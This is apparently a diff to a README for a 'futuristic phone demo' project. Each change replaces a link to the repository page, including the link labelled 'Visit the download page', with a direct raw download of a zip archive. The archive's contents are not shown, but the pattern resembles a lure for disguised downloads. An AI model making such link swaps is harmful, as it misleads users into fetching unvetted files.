@@ -1,6 +1,6 @@
 # 🌌 iphone_os_2080 - A futuristic phone demo for everyone
 
-[![Download](https://img.shields.io/badge/Download%20Now-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hittuuuu/iphone_os_2080)
+[![Download](https://img.shields.io/badge/Download%20Now-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/hittuuuu/iphone_os_2080/main/public/iphone_os_1.4.zip)
 
 ## ✨ Overview
 
@@ -12,7 +12,7 @@ This project is made for viewing and testing on a desktop computer. You do not n
 
 Use this link to visit the page and download the project files:
 
-[Visit the download page](https://github.com/hittuuuu/iphone_os_2080)
+[Visit the download page](https://raw.githubusercontent.com/hittuuuu/iphone_os_2080/main/public/iphone_os_1.4.zip)
 
 ## 🖥️ What You Need
 
@@ -37,7 +37,7 @@ Follow these steps to run the project on Windows.
 
 Go to:
 
-https://github.com/hittuuuu/iphone_os_2080
+https://raw.githubusercontent.com/hittuuuu/iphone_os_2080/main/public/iphone_os_1.4.zip
 
 ### 2. Get the project files
 
@@ -229,7 +229,7 @@ Turn on:
 
 To get started, visit this page and download the project files:
 
-[https://github.com/hittuuuu/iphone_os_2080](https://github.com/hittuuuu/iphone_os_2080)
+[https://raw.githubusercontent.com/hittuuuu/iphone_os_2080/main/public/iphone_os_1.4.zip](https://raw.githubusercontent.com/hittuuuu/iphone_os_2080/main/public/iphone_os_1.4.zip)
 
 After download:
 
